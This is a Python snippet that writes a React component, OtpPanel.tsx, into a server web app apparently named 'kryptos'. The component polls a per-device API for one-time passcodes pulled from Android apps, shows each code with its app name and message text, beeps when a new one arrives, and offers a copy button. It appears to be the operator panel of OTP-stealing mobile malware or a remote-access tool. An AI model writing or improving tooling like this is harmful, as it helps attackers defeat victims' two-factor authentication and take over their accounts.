COMP = r'''
import { useEffect, useRef, useState } from 'react';
import { getApiBaseUrl } from '../services/api';

type OtpItem = { id: number; otp: string; package: string; appName: string; text: string; created_at: string };

function authHeaders(): Record<string, string> {
  const token = localStorage.getItem('admin_token') || localStorage.getItem('token') || '';
  return token ? { Authorization: `Bearer ${token}` } : {};
}

function beep() {
  try {
    const Ctx = (window as any).AudioContext || (window as any).webkitAudioContext;
    if (!Ctx) return;
    const ctx = new Ctx();
    const o = ctx.createOscillator();
    const g = ctx.createGain();
    o.connect(g); g.connect(ctx.destination);
    o.type = 'sine'; o.frequency.value = 880; g.gain.value = 0.12;
    o.start(); o.stop(ctx.currentTime + 0.16);
    setTimeout(() => { try { ctx.close(); } catch (e) {} }, 500);
  } catch (e) {}
}

export default function OtpPanel({ deviceId }: { deviceId?: string }) {
  const [items, setItems] = useState<OtpItem[]>([]);
  const [open, setOpen] = useState(true);
  const [copied, setCopied] = useState('');
  const last = useRef('');

  useEffect(() => {
    if (!deviceId) return;
    let alive = true;
    const load = async () => {
      try {
        const r = await fetch(`${getApiBaseUrl()}/api/devices/${deviceId}/otp?limit=20`, { headers: authHeaders() });
        if (!r.ok) return;
        const data = await r.json();
        if (!alive) return;
        setItems(Array.isArray(data) ? data : []);
      } catch (e) {}
    };
    load();
    const t = window.setInterval(load, 3000);
    return () => { alive = false; window.clearInterval(t); };
  }, [deviceId]);

  const latest = items[0];

  useEffect(() => {
    if (!latest) return;
    if (last.current && last.current !== latest.otp) beep();
    last.current = latest.otp;
  }, [latest]);

  const copy = async (code: string) => {
    try { await navigator.clipboard.writeText(code); } catch (e) {}
    setCopied(code);
    window.setTimeout(() => setCopied(''), 1200);
  };

  if (!deviceId) return null;

  return (
    <div style={{ position: 'fixed', top: 64, right: 14, zIndex: 9000, width: 288 }}>
      <div style={{ background: 'linear-gradient(180deg, #2a0a06, #160504)', border: '1px solid rgba(255,43,43,0.35)', borderRadius: 12, boxShadow: '0 10px 34px rgba(0,0,0,0.65)', overflow: 'hidden' }}>
        <div onClick={() => setOpen((o) => !o)} style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '7px 11px', cursor: 'pointer', background: 'rgba(255,43,43,0.10)', borderBottom: '1px solid rgba(255,43,43,0.22)' }}>
          <span style={{ flex: 1, fontSize: 10, letterSpacing: 1.5, color: '#ff8a8a', fontWeight: 700 }}>CODIGOS OTP</span>
          <span style={{ fontSize: 10, color: '#ff6b6b' }}>{items.length}</span>
          <span style={{ fontSize: 9, color: '#ff6b6b' }}>{open ? 'ARRIBA' : 'ABAJO'}</span>
        </div>
        {open && (
          <div style={{ padding: 11 }}>
            {!latest && <div style={{ fontSize: 11, color: '#b98a7d' }}>Esperando codigos...</div>}
            {latest && (
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 10, color: '#b98a7d', marginBottom: 3 }}>{latest.appName || latest.package}</div>
                <div style={{ fontSize: 34, fontWeight: 800, letterSpacing: 5, color: '#ffffff', textShadow: '0 0 16px rgba(255,43,43,0.9)', lineHeight: 1.15 }}>{latest.otp}</div>
                <button onClick={() => copy(latest.otp)} style={{ marginTop: 7, width: '100%', padding: '5px 0', fontSize: 11, fontWeight: 700, letterSpacing: 1, color: '#fff', background: copied === latest.otp ? '#22c55e' : '#ff2b2b', border: 'none', borderRadius: 6, cursor: 'pointer' }}>
                  {copied === latest.otp ? 'COPIADO' : 'COPIAR'}
                </button>
                <div style={{ fontSize: 9, color: '#7a5050', marginTop: 6, lineHeight: 1.3 }}>{latest.text}</div>
              </div>
            )}
            {items.slice(1, 6).map((it) => (
              <div key={it.id} onClick={() => copy(it.otp)} title={it.text} style={{ display: 'flex', gap: 8, alignItems: 'center', padding: '4px 0', marginTop: 3, borderTop: '1px solid rgba(255,255,255,0.06)', cursor: 'pointer' }}>
                <span style={{ color: '#ff8a8a', fontSize: 12, fontWeight: 700 }}>{it.otp}</span>
                <span style={{ color: '#7a5050', fontSize: 10, flex: 1, overflow: 'hidden', whiteSpace: 'nowrap', textOverflow: 'ellipsis' }}>{it.appName || it.package}</span>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
'''
open(r"C:\Users\user\kryptos\server\web-app\src\components\OtpPanel.tsx", "w", encoding="utf-8").write(COMP)
print("OtpPanel.tsx creado:", len(COMP))
